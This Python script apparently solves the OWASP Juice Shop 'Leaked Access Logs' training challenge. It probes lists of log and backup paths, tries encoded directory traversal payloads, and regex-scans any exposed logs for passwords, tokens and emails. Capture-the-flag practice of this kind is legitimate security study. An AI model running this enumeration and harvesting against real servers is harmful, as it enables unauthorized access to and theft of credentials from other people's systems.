#!/usr/bin/env python3
"""
Leaked Access Logs Challenge Solver
===================================
Automated discovery and access of server log files in Juice Shop.

Target: Juice Shop instance
Challenge: Gain access to server access logs

Usage:
    python3 leaked_logs_solver.py
"""

import requests
import time
import sys
import re
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# CONFIGURATION - Change these values for your Juice Shop instance
# ============================================================================

# Change this URL to your Juice Shop instance
JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

# Common log file paths to test
LOG_PATHS = [
    # Direct log files
    "access.log", "access_log", "logs/access.log", "log/access.log",
    "error.log", "error_log", "logs/error.log", "log/error.log",
    "server.log", "app.log", "application.log", "debug.log",
    "juice-shop.log", "npm-debug.log", "node.log",

    # Backup files
    "access.log.bak", "access.log.old", "access.log.1", "access.log~",
    "access_log.bak", "access_log.old", "logs.bak", "logs.old",

    # Text files
    "access.txt", "logs.txt", "server.txt", "log.txt",

    # Admin/debug paths
    "admin/logs", "admin/access.log", "admin/log",
    "debug/logs", "_debug/access.log", "status/logs",

    # Hidden directories
    ".logs/access.log", "logs/.access.log", "_logs/access.log",

    # Development files
    "logs/development.log", "logs/debug.log", "tmp/access.log",
]

# Directory traversal payloads
TRAVERSAL_PAYLOADS = [
    "../access.log",
    "../../access.log",
    "../../../access.log",
    "..%2Faccess.log",
    "..%2F..%2Faccess.log",
    "%2E%2E/access.log",
    "%2E%2E%2Faccess.log",
    "%252E%252E/access.log",
    "....//access.log",
    "..;/access.log",
]

# Common log file extensions
LOG_EXTENSIONS = ["log", "txt", "bak", "old", "1", "2", "gz"]

# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class LeakedLogsSolver:
    """Leaked Access Logs Challenge solver"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        self.found_logs = []
        self.tested_paths = 0

    def print_banner(self):
        """Print challenge banner"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  LEAKED ACCESS LOGS CHALLENGE SOLVER{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}\n")
        print(f"{Colors.CYAN}Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        print(f"{Colors.CYAN}Objective: Find accessible server log files{Colors.ENDC}\n")

    def test_log_path(self, path):
        """Test if a log file path is accessible"""
        url = urljoin(self.base_url, path)

        try:
            response = self.session.get(url, timeout=5)
            self.tested_paths += 1

            # Check if response looks like a log file
            if response.status_code == 200:
                content = response.text[:1000]  # First 1000 chars

                # Log file indicators
                log_indicators = [
                    # Common log formats
                    'GET /', 'POST /', 'PUT /', 'DELETE /',
                    # IP addresses
                    r'\d+\.\d+\.\d+\.\d+',
                    # HTTP status codes
                    ' 200 ', ' 404 ', ' 500 ', ' 403 ',
                    # User agents
                    'Mozilla/', 'curl/', 'wget/',
                    # Apache log format
                    '"GET /', '"POST /',
                    # Nginx log format
                    'nginx', 'apache',
                    # Timestamps
                    '[', '] ', ' - - '
                ]

                content_lower = content.lower()
                indicator_count = sum(1 for indicator in log_indicators
                                    if indicator.lower() in content_lower)

                # Consider it a log file if multiple indicators present
                if (indicator_count >= 3 or
                    'access_log' in content_lower or
                    'error_log' in content_lower or
                    len([line for line in content.split('\n')[:10]
                         if any(method in line for method in ['GET', 'POST', 'PUT'])]) >= 2):

                    log_info = {
                        'path': path,
                        'url': url,
                        'size': len(response.content),
                        'preview': content[:200] + '...' if len(content) > 200 else content,
                        'indicators': indicator_count
                    }

                    self.found_logs.append(log_info)

                    print(f"   {Colors.GREEN}✅ FOUND LOG FILE: {path}{Colors.ENDC}")
                    print(f"      URL: {url}")
                    print(f"      Size: {len(response.content):,} bytes")
                    print(f"      Preview: {content[:100]}...")
                    return True

        except requests.exceptions.RequestException:
            pass  # Silently continue for failed requests

        return False

    def enumerate_log_files(self):
        """Enumerate potential log file locations"""
        print(f"{Colors.CYAN}🔍 Enumerating log file locations...{Colors.ENDC}")

        # Test basic paths first
        print(f"{Colors.CYAN}📁 Testing common log paths...{Colors.ENDC}")
        for path in LOG_PATHS:
            if self.test_log_path(path):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found accessible log: {path}{Colors.ENDC}")
                return True

            if self.tested_paths % 20 == 0:
                print(f"   Tested {self.tested_paths} paths...")

        # Test directory traversal
        print(f"\n{Colors.CYAN}🔀 Testing directory traversal...{Colors.ENDC}")
        for payload in TRAVERSAL_PAYLOADS:
            if self.test_log_path(payload):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found log via traversal: {payload}{Colors.ENDC}")
                return True

        # Test with different extensions
        print(f"\n{Colors.CYAN}📄 Testing different extensions...{Colors.ENDC}")
        base_names = ["access", "server", "app", "application", "error"]
        for base_name in base_names:
            for extension in LOG_EXTENSIONS:
                path = f"{base_name}.{extension}"
                if self.test_log_path(path):
                    print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found log: {path}{Colors.ENDC}")
                    return True

        return False

    def analyze_log_content(self, log_info):
        """Analyze found log file for sensitive information"""
        print(f"\n{Colors.CYAN}🔬 Analyzing log content for sensitive data...{Colors.ENDC}")

        try:
            url = log_info['url']
            response = self.session.get(url)
            content = response.text

            # Look for sensitive patterns
            sensitive_patterns = {
                'Passwords in URLs': [
                    r'password=([^&\s]+)',
                    r'pass=([^&\s]+)',
                    r'pwd=([^&\s]+)'
                ],
                'API Keys/Tokens': [
                    r'token=([^&\s]+)',
                    r'key=([^&\s]+)',
                    r'api[_-]key=([^&\s]+)'
                ],
                'Email Addresses': [
                    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                ],
                'IP Addresses': [
                    r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                ],
                'SQL Injection Attempts': [
                    r"'.*OR.*'.*='",
                    r"UNION.*SELECT",
                    r"DROP.*TABLE"
                ],
                'XSS Attempts': [
                    r'<script.*?>',
                    r'javascript:',
                    r'onload.*='
                ]
            }

            findings = {}
            for category, patterns in sensitive_patterns.items():
                matches = []
                for pattern in patterns:
                    found = re.findall(pattern, content, re.IGNORECASE)
                    matches.extend(found[:5])  # Limit to first 5 matches

                if matches:
                    findings[category] = list(set(matches))  # Remove duplicates

            # Print analysis results
            if findings:
                print(f"{Colors.GREEN}🔍 Sensitive data found in logs:{Colors.ENDC}")
                for category, items in findings.items():
                    print(f"   {Colors.YELLOW}{category}:{Colors.ENDC}")
                    for item in items[:3]:  # Show first 3
                        print(f"      - {item}")
            else:
                print(f"{Colors.YELLOW}⚠️  No obvious sensitive data patterns found{Colors.ENDC}")

            # Log statistics
            lines = content.split('\n')
            print(f"\n{Colors.CYAN}📊 Log Statistics:{Colors.ENDC}")
            print(f"   Total lines: {len(lines):,}")
            print(f"   File size: {len(content):,} bytes")
            print(f"   Unique IPs: {len(set(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content)))}")

            return findings

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to analyze log content: {e}{Colors.ENDC}")
            return {}

    def solve_challenge(self):
        """Main method to solve the leaked access logs challenge"""
        self.print_banner()

        # Enumerate log files
        success = self.enumerate_log_files()

        if success and self.found_logs:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 LEAKED ACCESS LOGS CHALLENGE COMPLETED!{Colors.ENDC}")
            print(f"{Colors.GREEN}Found {len(self.found_logs)} accessible log file(s):{Colors.ENDC}")

            for log in self.found_logs:
                print(f"\n   {Colors.CYAN}📄 {log['path']}{Colors.ENDC}")
                print(f"      URL: {log['url']}")
                print(f"      Size: {log['size']:,} bytes")

                # Analyze the first found log
                if log == self.found_logs[0]:
                    self.analyze_log_content(log)

            return True
        else:
            print(f"\n{Colors.RED}❌ No accessible log files found{Colors.ENDC}")
            print(f"{Colors.YELLOW}Tested {self.tested_paths} potential paths{Colors.ENDC}")

        return False


def main():
    """Main entry point"""
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        # Use default URL - CHANGE THIS FOR YOUR INSTANCE
        base_url = JUICE_SHOP_URL

    print(f"{Colors.YELLOW}🎯 Starting Leaked Access Logs Challenge{Colors.ENDC}")
    print(f"{Colors.YELLOW}Target: {base_url}{Colors.ENDC}")

    solver = LeakedLogsSolver(base_url)
    success = solver.solve_challenge()

    if not success:
        print(f"\n{Colors.CYAN}💡 Manual alternatives:{Colors.ENDC}")
        print(f"1. Check robots.txt for disallowed paths")
        print(f"2. Use directory enumeration tools (dirb, gobuster)")
        print(f"3. Try parameter-based file access (?file=access.log)")
        print(f"4. Check for backup files (.bak, .old, .1)")
        print(f"5. Test directory traversal (../access.log)")

        print(f"\n{Colors.CYAN}🔧 Manual testing commands:{Colors.ENDC}")
        print(f"curl -I {base_url}/access.log")
        print(f"curl -I {base_url}/logs/access.log")
        print(f"curl {base_url}/access_log")

if __name__ == '__main__':
    main()